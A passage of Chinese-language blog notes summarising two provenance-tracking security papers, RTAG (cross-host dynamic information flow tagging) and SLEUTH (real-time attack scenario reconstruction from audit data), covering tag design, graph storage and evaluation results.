切换全局和本地标签</h2><p>7.1节中定义的全局标签，足以在多主机环境下，表示特定版本文件的某个字节。但是为每个DIFT任务分配全局标签，实际上是一种浪费，因为RTAG的每个DIFT任务仅覆盖一个进程组，因此确保进程组级唯一性的本地标签就足够了。因此，对于每个DIFT任务，我们<strong>基于其源符号的熵</strong>（what？）使用不同的标签大小。 在进行DIFT之前，RTAG将标签从全局标签切换到本地标签，并在完成DIFT后将标签切换回全局标签。  DIFT的标签是本地的，因为它仅需要唯一地标识当前<strong>进程内DIFT</strong>（in-process DIFT）中源的每个字节，而不是标识跨主机的数据字节。</p><p>进一步，每个DIFT中源的数量取决于可达性分析，通常会由数据修剪而极大的减少。换句话说，本地标签的大小取决于干扰（interference）情况。（干扰越多，也就是可达数据越少，有效的数据越少，就可以用更小的local tag来表示）。因此，本地标签的<strong>信息熵</strong>要远小于全局标签。举个例子来说，如果一个程序仅从DIFT中标记为源的文件那里读取10个字节，那么本地标签仅用4 bits就可以将其表示，这与全局标签的208 bits相比简单了不少。</p><p>标签的大小不仅会影响源和目的的symbol，还会影响所有中间存储器和寄存器，因为标签会根据DIFT的传播策略，随每个指令的执行一起被复制，合并或更新。<strong>标签大小；影响整个标签映射的内存成本</strong>，<strong>所以标签切换显着降低了DIFT的总体内存成本</strong>。（本节主旨）</p><h2 id="75-最佳本地标签分配"><a class="markdownIt-Anchor" href="#75-最佳本地标签分配"></a> 7.5 最佳本地标签分配</h2><ul><li>采用记录-重放机制的原因：</li></ul><p>现存的DIFT引擎系统是在程序运行时工作的，事先不了解关于数据的源或者目的地的信息，所以要为其分配一个固定大小的标签，以确保其足够大。这样就会消耗大量的系统资源。</p><p>相比于在程序运行时执行DIFT，RTAG采用的是记录 - 重放机制，这样，在重放阶段实施DIFT时，关于数据源和目的的信息就已知了。这样，我们就可以动态调节标签大小，而不是采用固定大小的标签了。</p><p>下图比较了不同DIFT引擎标签映射的内存消耗情况：</p><p><img src="https://img-blog.csdnimg.cn/20200215230708134.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><ul><li><strong>操作过程</strong>：</li></ul><p>在执行DIFT之前，RTAG会计算最佳本地标签来标记源，并在将源加载到进程的内存空间时（例如，通过read() 系统调用）将全局标签替换为本地标签。 在执行DIFT时，当内存单元或寄存器因为某些标签被污染（恶意）时，RTAG会为中间位置（中间态？）分配标签。 当传播到达目的地时（例如，通过write() 系统调用），RTAG将本地标签替换为原始的全局标签，并更新目的地的标签值。</p><h2 id="76-标签关联"><a class="markdownIt-Anchor" href="#76-标签关联"></a> 7.6 标签关联</h2><p>为了追踪不同主机之间的数据流，我们还附加了操作内核的<strong>hook the socket</strong>处理，以启用跨主机标记（cross-host tagging）。本文提出了一种 “in-band” 的方法，在主机之间追踪数据流，这种方法尤其适合系统层面的可达性分析和DIFT。</p><p>本文设计的跨主机的标签方法依赖于socket协议的特征：TCP和UDP</p><ul><li>TCP：可靠传输，我们依赖TCP连接中字节的顺序，从而可以在字节层面识别数据流。注意到，尽管TCP控制着数据流的顺序，但是发送发和接收方之间在接受和发送数据的时候，可能运行着不同数目的系统调用。举个例子，发送方可能执行五个writev（）系统调用以发送10,000字节的数据（每个调用2,000字节），而接收方可以进行10个read（）调用（每个调用1,000字节）以检索完整的数据。 这就是为什么需要对发送或接收的字节进行计数，而不是对系统调用数进行计数的原因。</li><li>UDP：不可靠传输，在传输过程中可能会丢包。因此，我们不能依赖传输字节的顺序，因为目标主机不知道应该到达哪些数据以及丢失了哪些数据。 为了支持UDP，我们在源主机的每个发送相关系统调用中嵌入了一个小的**“跨主机”标签**，并在目标主机的接收相关系统调用中解析了该标签。 在计算校验和之前，将标签作为用户数据报的一部分插入到数据报的开头。 如果数据报传输成功，RTAG就会知道从源到目的的数据长度。 如果目标主机发现接收到的数据报已损坏或完全丢失，它将丢弃该数据报，因此RTAG也意识到丢失的情况，并从可达性分析和DIFT中清除了该入站数据。 评估显示，TCP情况的通信成本为0，而UDP的成本在基准测试中也很微不足道。</li></ul><p>跨主机标签表示跨主机的两个进程之间的套接字通信中的字节级数据。 每个<strong>标签键</strong>（tag key）使用源和目的进程凭证，代表一个套接字会话中的数据流量；使用偏移量来标识字节层面的数据。</p><p>对于会话的唯一性，我们使用进程标识符（pid）和进程创建时间来标识每个进程。</p><p>（不懂）<strong>标签值</strong>（tag value）表示标签键的来源，其由DIFT决定，并且更新为全局标签图（global tag map）。</p><p>对于跨主机的标签，我们同样在执行DIFT之前进行切换，然后在之后进行恢复。（不还是切换全局和本地标签嘛?）</p><ul><li>处理进程内通信：</li></ul><p>RTAG也可以追踪两个进程之间的数据传送（上面讲的是两台host之间的通信）。IPC使用系统调用作为控制接口，RATG通过<strong>hook系统调用</strong>来追踪传送的数据。当进程使用pipe将数据发送到子进程时，RTAG监视读写系统调用以跟踪传输的数据（以字节为单位）。在可达性分析过程中，我们<strong>创建标签键来标记从parent发送到child的每个字节</strong>。 标签值由DIFT实现。 另外，RTAG基于共享内存来追踪IPC，这样就可以在进程的内存单元内，传播此共享内存的标签。 这些过程不需要单独的标签分配。</p><h2 id="77-查询系统正反向分析"><a class="markdownIt-Anchor" href="#77-查询系统正反向分析"></a> 7.7 查询系统（正反向分析）</h2><p>例如，在图中，对攻击者受控主机5.5.5.5:22的<strong>向后查询</strong>（backward query）将返回图（b）中描绘的树形数据流覆盖图。（回溯分析）</p><p><img src="https://img-blog.csdnimg.cn/2020021523083948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>另外，前向查询会从被请求的标签键到它所有的影响，返回数据流的每一个片段。它依赖于反向映射，在该映射中标签键和值被交换以定位文件的下游影响。例如，对客户端的私钥id_rsa的前向查询返回一个流：</p><p><img src="https://img-blog.csdnimg.cn/20200215230852464.png" alt="" /></p><p>通过对这两个节点执行前向和后向查询，然后计算两个结果树的交点，点对点查询可提供起源图中两个节点之间的详细数据流。</p><h1 id="8-实施"><a class="markdownIt-Anchor" href="#8-实施"></a> 8 实施</h1><p>系统实施是基于单主机的<a href="https://dl.acm.org/doi/pdf/10.1145/3133956.3134045?download=true" target="_blank" rel="noopener">RAIN</a>，然后在其基础上<strong>扩展了标签系统</strong>。</p><p>关于追踪Socket连接：</p><ul><li>TCP：使用计数器，通过追踪send/write系统调用的返回值，来计数发送或接受字节的总数</li><li>UDP：在内核函数sendmsg内负载缓冲区的开头，插入一个递增的四字节序号；而不是在类似于send/recv这样的系统调用函数内插入，为的是避免影响用户程序的接口、避免校验和计算。在接收端，在计算完校验和之后，在recvmsg中剥去序列号，得到原始的载荷。（hooking）</li></ul><h1 id="9-评估"><a class="markdownIt-Anchor" href="#9-评估"></a> 9 评估</h1><p>评价目标在于解决以下问题：</p><ul><li>RTAG在跨主机攻击调查中，处理数据流查询时的表现如何，包括前向查询、后向查询、点对点查询</li><li>RTAG对基于DIFT的分析提升了多少效率，包括时间和内存消耗</li><li>RTAG会造成多少带宽和内存消耗</li></ul><h2 id="91-攻击场景"><a class="markdownIt-Anchor" href="#91-攻击场景"></a> 9.1 攻击场景</h2><p>（重要）下图总结了攻击调查中，处理一个query的每个阶段的统计情况：原始的Provenance Graph包含了所有的主机；Pruned Graph中，由可达性分析将与攻击无关边和节点过滤掉（可达性分析用于过滤！）；Data Flow Overlay中，标签存储查询所涉及的每个数据字节的来源。</p><p><img src="https://img-blog.csdnimg.cn/20200215230903983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>下图汇总了每个query所花费的时间和内存：</p><p><img src="https://img-blog.csdnimg.cn/20200215230935213.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>评估所用到的场景：</p><ul><li>GitPwnd</li><li>Web-based Attacks：SQLi、CSRF、XSS</li><li>Memory Corruption涉及内存损坏的攻击：整数溢出、缓冲区溢出</li><li>P2P网络中文件的传播：我们还运行RTAG来跟踪P2P网络上恶意文件传播中的数据流，这在分散式文件共享中被视为越来越大的威胁（例子）</li></ul><h2 id="92-性能"><a class="markdownIt-Anchor" href="#92-性能"></a> 9.2 性能</h2><ul><li><p>DIFT性能：</p><p><img src="https://img-blog.csdnimg.cn/20200215230959162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p></li></ul><p>在RTAG中，总时长消耗取决于最长的DIFT任务，所以还需要继续寻找集成化的进程间并行DIFT技术来进一步降低时间消耗。</p><ul><li>运行时间开销：</li></ul><p>分别用CPU和IO运行时间来衡量。CPU消耗时间如下图所示，结果表明RTAG和RAIN相似，其运行时间开销都比较低。</p><p><img src="https://img-blog.csdnimg.cn/20200215231011167.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>IO运行时间消耗如下图所示</p><p><img src="https://img-blog.csdnimg.cn/20200215231021116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><ul><li>网络性能开销：</li></ul><p>所有的网络开销都可以忽略不计。</p><p><img src="https://img-blog.csdnimg.cn/202002152310303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><h1 id="10-相关工作"><a class="markdownIt-Anchor" href="#10-相关工作"></a> 10 相关工作</h1><ul><li>DIFT：动态污点分析是一种众所周知的技术，用于在程序运行时逐条指令跟踪信息流指令，而无需依赖程序源文件或二进制文件的语义。  DIFT可用于策略执行，恶意软件分析和检测隐私泄漏。</li><li>Provenance Capturing：使用data provenance来调查APT是比较流行的研究领域。</li><li>Network Provenance：网络层面的provenance也是研究热点。其弱点显而易见，就是无法检测大部分终端上系统层面的因果关系。<strong>但是基于网络和基于主机的Provenance是相互正交的，因此我们可以将二者结合起来。</strong>（妙哇！）</li><li>记录和重放系统：确定性的记录和重放是研究热点，最新的作品还可以记录不确定性的事件。</li><li>未来研究的方向：<ul><li>使运行RTAG的主机与不运行系统的主机可互操作。 为此，计划将标签信息嵌入UDP标头的可选字段中</li><li>能够实现在给定网络中，RTAG可能没有运行在每台主机上的情况下，仍可以识别信息流并还原事实</li><li>将进程内（in-precess）的并行DIFT集成到RTAG中，进一步优化运行时间</li><li>减少对不确定性输入的存储空间需要</li><li>扩展RTAG支持的query，以便可以<strong>比较同一程序的不同执行</strong>相关的信息流。 这样，就有可能查明程序何时何地受到威胁。</li></ul></li></ul><h1 id="11-进一步理解"><a class="markdownIt-Anchor" href="#11-进一步理解"></a> 11 进一步理解</h1><ul><li>在provenance graph上构建出tag overlay，然后借助tag overlay的反向分析过程：</li></ul><p><img src="https://s2.ax1x.com/2020/02/21/3u2PvF.png" alt="" /></p><ul><li>本文的重点是讲tag overlay是怎么来的：</li></ul><p><img src="https://s2.ax1x.com/2020/02/21/3u2pCV.png" alt="" /></p><p>在起源图上，为每个数据的每个字节分配global tag，tag switch负责将global tag切换为local tag；tag allocation负责确定最佳大小的local tag；tag association负责关联不同进程、不同主机；同之DIFT在每个进程上并行执行，最后生成tag overlay。</p>]]></content>
      
      
      <categories>
          
          <category> 科研 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科研 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PaperNote-SLEUTH：基于COTS审计数据的实时攻击场景重构</title>
      <link href="/2020/02/21/PaperNote-SLEUTH%EF%BC%9A%E5%9F%BA%E4%BA%8ECOTS%E5%AE%A1%E8%AE%A1%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AE%9E%E6%97%B6%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E9%87%8D%E6%9E%84/"/>
      <url>/2020/02/21/PaperNote-SLEUTH%EF%BC%9A%E5%9F%BA%E4%BA%8ECOTS%E5%AE%A1%E8%AE%A1%E6%95%B0%E6%8D%AE%E7%9A%84%E5%AE%9E%E6%97%B6%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%E9%87%8D%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>原文标题：SLEUTH: Real-time Attack Scenario Reconstruction from COTS Audit Data</p><p>原文作者：Md Nahid Hossain, <em>Stony Brook University;</em> Sadegh M. Milajerdi, <em>University of Illinois at Chicago;</em> Junao Wang, <em>Stony Brook University;</em> Birhanu Eshete and Rigel Gjomemo, <em>University of Illinois at Chicago;</em> R. Sekar and Scott Stoller, <em>Stony Brook University;</em> V.N. Venkatakrishnan, <em>University of Illinois at Chicago</em></p><p>原文来源：USENIX 2017</p><p>原文链接：<a href="https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/hossain" target="_blank" rel="noopener">https://www.usenix.org/conference/usenixsecurity17/technical-sessions/presentation/hossain</a></p><h1 id="1-摘要"><a class="markdownIt-Anchor" href="#1-摘要"></a> 1 摘要</h1><p>本文提出了一种可以在企业主机上<strong>实时重构攻击场景</strong>的方法和系统——SLEUTH，开发了一种<strong>平台无关</strong>、<strong>基于主存</strong>的审计日志数据<strong>依赖图抽象</strong>。</p><p>本文提出了一种<strong>基于标签</strong>的技术来分析攻击行为，包括<strong>源识别和影响分析</strong>。同时本文通过构建<strong>简洁、可视的攻击步骤</strong>来揭示攻击的总体情况。系统所用的评估数据仍然来自DARPA组织的红队攻击。</p><h1 id="2-介绍"><a class="markdownIt-Anchor" href="#2-介绍"></a> 2 介绍</h1><p>像IDS和SIEM这样的工具会产生大量的信息，安全分析人员从中辨别出真正的攻击变得十分困难；而且，对于跨越多个应用、主机以及时间跨度很长的攻击行为，分析人员缺乏工具将这些片段拼凑起来。因此，分析人员所需要的工具不仅能够检测攻击，而且能够产生基于因果的攻击链的简单总结。据此，分析人员可以快速判断系统是否遭受了入侵、了解攻击者是如何发动攻击的以及确定攻击带来的影响。</p><p>实时检测相对于取证分析（Forensic Analysis）而言，存在下面几个挑战：</p><ul><li><strong>事件（Event）存储和分析</strong>：如何高效地存储上百万条记录，并在几秒钟的时间内筛选这些数据</li><li><strong>将实体（Entities）按优先级排序</strong>：如何协助分析人员，在大量的数据中优先选出并放大最有可能是攻击行为的场景。</li><li><strong>场景重构</strong>：如何从攻击者的入口点开始，简洁地总结攻击场景，并识别整个攻击行为的影响</li><li><strong>处理常见的使用场景</strong>：如何处理类似于攻击期间活动的正常行为，如软件下载</li><li><strong>快速地交互式推理</strong>：如何让分析人员通过数据有效地进行推理，比如在“可选择性假设”的情况下。</li></ul><h2 id="21-方法概览"><a class="markdownIt-Anchor" href="#21-方法概览"></a> 2.1 方法概览</h2><p><img src="https://img-blog.csdnimg.cn/20200212095101709.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NjMGZpZTFk,size_16,color_FFFFFF,t_70" alt="" /></p><p>来自不同操作系统的审计数据被处理成平台独立的图，其中<strong>顶点表示subjects</strong>（进程）和<strong>objects</strong>（文件、sockets）；<strong>边表示审计事件</strong>（读、写、执行等操作；连接）。这个图作为攻击检测、关联分析和场景重构的基础。</p><h2 id="22-贡献"><a class="markdownIt-Anchor" href="#22-贡献"></a> 2.2 贡献</h2><h3 id="221-基于内存的依赖图表示"><a class="markdownIt-Anchor" href="#221-基于内存的依赖图表示"></a> 2.2.1 基于内存的依赖图表示</h3><p>为了应对第一个挑战，本文开发了简洁的<strong>基于内存</strong>的依赖图表示，解决了如何高效地存储和分析事件的问题。基于主存的图算法可以比基于硬盘快几个数量级，这是本文能做到实时分析的一个重要因素。在实验中能够在14秒内处理79小时的FreeBSD审计数据，内存消耗84MB，该速度比数据生成速度快20K倍。</p><h3 id="222-基于标签"><a class="markdownIt-Anchor" href="#222-基于标签"></a> 2.2.2 基于标签</h3><p>为了应对第二个挑战，本文开发了<strong>基于标签</strong>（tag-based）的方法来识别最有可能涉及攻击的subjects、objects和events。标签代表对数据（objects）和进程（subjects）的**可信度（trustworthiness）<strong>和</strong>敏感度（sensitivity）**的评估。</p><h3 id="223-利用标签进行溯源和影响性分析"><a class="markdownIt-Anchor" href="#223-利用标签进行溯源和影响性分析"></a> 2.2.3 利用标签进行溯源和影响性分析</h3><p>为了应对第三个挑战，本文开发的算法可以使用标签来对攻击进行溯源和影响性分析。从告警产生的位置来时，<strong>回溯分析</strong>算法可以根据图中的依赖性识别攻击的源头；从攻击源头开始，<strong>前向搜索</strong>算法可以进行全面的影响分析。同时，本文提出了一些准测用来修剪这些搜索过程，从而生成简洁的图。实验结果表明，SLEUTH可以将38.5M的事件转换为包含130个事件的攻击场景图，其大小降低了5个数量级。</p><h3 id="224-可定制的策略框架"><a class="markdownIt-Anchor" href="#224-可定制的策略框架"></a> 2.2.4 可定制的策略框架</h3><p>为了应对最后两个挑战，本文提出了可定制的策略框架，用于标签的初始化和传播。本文的框架给出了合理的默认值，但也可以根据特定的操作系统或应用来进行调整，从而避免误报。</p><p>分析人员还可以测试攻击的“可选择性假设”，如果分析人员怀疑某个行为是攻击的结果，可以使用策略捕获这些行为，然后重新运行分析以发现其原因和影响（重放）。由于其处理和分析比数据的生成快上万倍，所以可以对假设进行高效、并行、实时的测试。</p><h3 id="225-实验评估为darpa-tc项目"><a class="markdownIt-Anchor" href="#225-实验评估为darpa-tc项目"></a> 2.2.5 实验评估为DARPA TC项目</h3><p>在此次评估中，攻击活动模拟现代的APT组织在Windows、FreeBSD和Linux上展开了为期两周的攻击。在评估中，SLEUTH可以做到：</p><ul><li>在几秒钟的时间内，处理包含数千万事件的审计日志</li><li>成功地检测和重构攻击细节，包括攻击入口点、在系统中的活动和逃逸点</li><li>过滤与攻击不相关的事件（削减率可以到达100K倍），从而可以提供一个关于攻击的几乎没有噪声的语义表示</li><li>较低的误报率和漏报率</li></ul><p>该系统设计的目的不在于检测出最高级的APT攻击，而是在给定许多未知可能性的情况下，<strong>不需要人工干预</strong>，该系统就能够实时的给出一个按照威胁程度排列的结果。</p><h1 id="3-主存依赖图"><a class="markdownIt-Anchor" href="#3-主存依赖图"></a> 3 主存依赖图</h1><p>为了支持快速检测和实时分析，本文以图作为数据结构存储依赖关系。一种可行的方法是使用图数据库，例如Neo4J、Titan，但是除非内存足够大，否则这些数据库在运行许多图算法时会受到限制；另外，对于我们的问题来说，一般的图数据库内存消耗太高，即便是进行过内存优化的两个图数据库STINGER和NetworkX，存储一条边也要消耗250 bytes和3 KB。因此，本文提出了一种<strong>更加节省内存的依赖图设计</strong>，每条边仅占10 bytes，在实验中存储38M的事件仅需要329MB的内存。</p><p>依赖图包含两种类型的<strong>实体</strong>：</p><ul><li>Subjects：<ul><li>表示进程；</li><li>属性值包括：process id（pid）、命令行、所有者（owner）以及代码和数据的标签</li></ul></li><li>Objects：<ul><li>表示文件、pipes、网络连接</li><li>属性值包括：名称、类型（文件、pipe、socket等）、所有者和标签</li></ul></li></ul><p><strong>事件</strong>：subjects和objects之间或者两个subjects之间带标签的边，用<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>a</mi><mi>d</mi><mi mathvariant="normal">、</mi><mi>c</mi><mi>o</mi><mi>n</mi><mi>n</mi><mi>e</mi><mi>c</mi><mi>t</mi><mi mathvariant="normal">、</mi><mi>e</mi><mi>x</mi><mi>e</mi><mi>c</mi><mi>v</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">read、connect、execve</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault">c</span><span class="mord mathdefault">o</span><span class="mord mathdefault">n</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span></span></span></span>来表示</p><p>为了减少依赖图的存储需求，在所有可能的地方，<strong>使用32-bit的标识符而不是64-bit的指针</strong>，这使得单台主机的依赖图可以存储40亿的subjects和objects，我们所使用的数据集远小于该数字。</p><p>本文的设计强调实体的简洁数据结构，然而<strong>事件的简洁性</strong>更为重要。因为事件的数量要比实体大两个数量级，而且事件和实体的比例随着时间而增加。因此我们需要为事件设计一个更加简洁的表示，使许多事件仅用6 bytes就能表示。</p><p><strong>事件存储在subjects中</strong>，从而消除了subject-event的指针、事件标识符（event id）的需求。他们的表示采用<strong>可变长编码</strong>，在通常情况下可以采用4 bytes，当需要时可以扩展到8、12或者16 bytes。</p><p>（不懂）大多数事件是对objects进行操作，并且有<strong>时间戳</strong>。由于每个subject的事件顺序保持不变，因此我们无需为时间戳设置微秒级的粒度，而是选择了毫秒级的粒度。另外，我们仅存储同一subject中自上一个事件以来的相对时间，这使得我们在通常情况下可以使用16-bits来表示时间戳。</p><p>object使用索引指向<strong>object标识符</strong>的<strong>per-subject表</strong>。这些索引可以看作文件描述，他们通常都是一些较小的值，因为大多数的subjects使用了相对较少的objects，这使得object引用（索引？？）可以用8 bits或更少来表示。</p><p>我们用3 bits或更少<strong>对经常出现的事件名称进行编码</strong>，如open、close、read和write。这给我们留下了几位用于存储事件变量信息的摘要，同时仍在32位之内。</p><p>（重要）对于取证分析来说，需要我们从object追溯subject。鉴于此，我们需要<strong>使用object-event记录</strong>来维护objects中的事件信息。该记录仅维护事件的一部分子集，具体而言，比如像read和write这样会导致数据流的事件。object-event记录可以通过<strong>存储一个指向对应subject-event记录的引用</strong>来进一步收缩，而不是复制完全一样的信息。</p><p>类似于subject-event记录，我们对<strong>object-event记录</strong>也采用<strong>可变长编码</strong>，使得他们在通常情况下只需要16 bits来存储。我们注意到，object一次仅被一个subject操作，这个subject可能会在该object上进行一系列的动作，比如打开、读、写、关闭。每个动作都对应一个subject-event记录和object-event记录，由于这些记录的subject和object是相同的，所以我们可以在object-event记录中重用subject，从而在大多数记录中可以不存储subject标识符。</p><p>接下来，我们允许object-event记录为subject中的事件记录存储一个<strong>相对索引</strong>，subject中两个连续的事件记录可能比较接近，一般会是几十或者几百个。这意味着存储在object-event记录中的相对索引大多数情况下12 bits就够了，所以我们分配16 bits足矣。</p><p>（总结）这种设计使我们使用<strong>6 bytes</strong>就可以存储<strong>双向的带时间戳的</strong>边，subject-event记录占4 bytes，object-event记录占2字节。在实验中使用更大的数据集时，平均每个事件占用内存也在10 bytes以内。可变长编码还使得我们可以表示重要但出镜率比较少的事件，比如<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>n</mi><mi>a</mi><mi>m</mi><mi>e</mi><mi mathvariant="normal">、</mi><mi>c</mi><mi>h</mi><mi>m</mi><mi>o</mi><mi>d</mi><mi mathvariant="normal">、</mi><mi>e</mi><mi>x</mi><mi>e</mi><mi>c</mi><mi>v</mi><mi>e</mi><mi mathvariant="normal">等</mi></mrow><annotation encoding="application/x-tex">rename、chmod、execve等</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">、</span><span class="mord mathdefault">e</span><span class="mord mathdefault">x</span><span class="mord mathdefault">e</span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mord mathdefault">e</span><span class="mord cjk_fallback">等</span></span></span></span>。</p><h1 id="4-标签和攻击检测"><a class="markdownIt-Anchor" href="#4-标签和攻击检测"></a> 4 标签和攻击检测</h1><p>问题：标签是什么？？</p><p>我们使用标签来描述<strong>objects和subjects的可信度和敏感度</strong>。对可信度和敏感度的评估基于以下三个因素：</p><ul><li>起源（Provenance）：依赖图中，subject或object直接祖先的标记</li><li>系统先验知识：我们对一些重要应用行为的了解，比如远程接入服务器、软件安装程序和重要的文件（/etc/passwd 和 /dev/audio）</li><li>行为：观察subject的行为，并将其与预期行为进行比较</li></ul><p>一个<strong>默认的策略</strong>被用从从input到output<strong>传播标签</strong>：为output分配input的可信度标签中的最低值，以及机密性标签的最大值（也就是说，入口点的行为是危险的，出口点的行为也被标注为危险；入口点的数据是机密的，出口点的数据也被标注为是机密的）。这是一种保守的策略，该策略可能会导致一些良性事件被错误地识别为恶意事件（over-tainting），但绝不会漏掉攻击。</p><p><strong>标签在SLEUTH中扮演了核心角色</strong>。它为攻击检测提供了重要的上下文信息，每个事件都在这些标记组成的上下文中进行解释，以确定其导致攻击的可能性。此外，标签对我们的前向和回溯分析的速度也很有用。最后，标签为消除大量与攻击无关的审计数据也起到了关键作用。</p><h2 id="41-标签设计"><a class="markdownIt-Anchor" href="#41-标签设计"></a> 4.1 标签设计</h2><p>如下定义<strong>可信度标签（trustworthiness tags，t-tags）</strong>，可信度依次降低：</p><ul><li><strong>良性可信标签（Benign authentic tag）</strong>：为<strong>数据和代码</strong>分配该标签，被认为是良性，且其来源（source）的可靠性是可被验证的</li><li><strong>良性标签（Benign tag）</strong>：为<strong>数据和代码</strong>分配该标签，被认为是良性，但是来源可靠性<strong>未被充分验证</strong></li><li><strong>未知标签（Unknown tag）</strong>：为<strong>数据和代码</strong>分配该标签，其来源未知</li></ul><p>策略（policy）定义了那些来源是良性的，哪些来源验证是充分的；策略的最简单情况是白名单。如果对于某个源，没有策略应用在它上面，那么这个源则被打上未知标签。</p><p>如下定义<strong>机密性标签（confidentiality tags，c-tags）</strong>，机密性依次降低：</p><ul><li><strong>Secret</strong>：高度敏感的信息，例如登陆凭证、私钥</li><li><strong>Sensitive</strong>：数据的披露可能会对安全产生重大影响，例如，披露了系统中的漏洞，但没有为攻击者提供访问系统的直接途径。</li><li><strong>Private</strong>：资料的披露涉及私隐，但未必构成安全威胁。</li><li><strong>Public</strong>：可以被公开的数据</li></ul><p>我们设计的一个重要方面是<strong>分离代码和数据的t-tag</strong>。具体而言，即一个<strong>subject</strong>给定两个t-tag，一个表示其<strong>代码可信度（code trustworthiness，code t-tag）</strong>，另一个表示其<strong>数据可信度（data trustworthiness，data t-tag）</strong>。这样的设计通过将注意力放在少数的几个可疑事件上，可以削减重建场景的规模，加快取证分析的速度。而<strong>机密性标签仅仅与数据相关联。</strong></p><p>（重要）已经存在的objects和subjects使用<strong>标签初始化策略</strong>分配初始标签。在系统执行过程中还会产生新的objects和subjects，它们由<strong>标签传播策略</strong>分配标签。最后，<strong>基于行为的检测策略</strong>来检测攻击。</p><h2 id="42-基于标签的攻击检测"><a class="markdownIt-Anchor" href="#42-基于标签的攻击检测"></a> 4.2 基于标签的攻击检测</h2><p>检测方法不应该要求知晓特定应用的一些细节，因为这需要有关应用程序的专家知识，而在动态环境中，应用程序可能会频繁更新。</p><p>我们不把着眼点放在变化的应用行为上，而是着眼于攻击者的高级别目标，比如后门插入和信息窃取。具体而言，我们结合了攻击者的<strong>动机和手段</strong>的推理，注意到我们提出的<strong>标签</strong>就是用来捕获攻击者的手段：如果一段数据或代码有<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">未</mi><mi mathvariant="normal">知</mi><mi mathvariant="normal">标</mi><mi mathvariant="normal">签</mi></mrow><annotation encoding="application/x-tex">未知标签</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0em;vertical-align:0em;"></span><span class="mord cjk_fallback">未</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">标</span><span class="mord cjk_fallback">签</span></span></span></span>，那么它就是由不受信任的源产生的。</p><p>根据攻击者的攻击步骤，我们<strong>定义</strong>了下面包含攻击者目标和手段的<strong>策略</strong>（Detection Policy）：</p><ul><li><strong>不受信任的代码执行</strong>：当一个拥有高code t-tag的subject执行或<strong>加载拥有低t-tag的object</strong>时，便会引发警报</li><li><strong>被拥有低code t-tag的subject修改</strong>：当拥有低code t-tag的subject修改一个拥有高t-tag的object时，便会引发警报。修改的可能是文件内容或者文件名、文件权限等。</li><li><strong>机密文件泄露</strong>：当不可信的subjects泄漏敏感数据时，将触发警报。具体地说，也就是具有sensitive c-tag 和 unkonwn code t-tag的subject在网络中执行写操作时会触发警报。</li><li><strong>为执行准备不可信的数据</strong>：该策略由一个拥有unknown 